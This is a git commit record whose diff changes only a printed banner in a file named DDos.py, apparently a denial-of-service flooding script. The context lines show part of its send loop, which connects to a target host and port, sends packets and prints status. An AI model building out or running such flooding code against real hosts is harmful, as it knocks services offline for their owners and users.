3209e88457ddbadbded447964db366c0748cdc94
Anup Ganiger <103352759+hacker-hub8@users.noreply.github.com>
2023-05-04 10:00:13 +0530

    Update DDos.py

--- DDos.py
+++ DDos.py
@@ -47,7 +47,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! JerryDDos--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! DDos--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
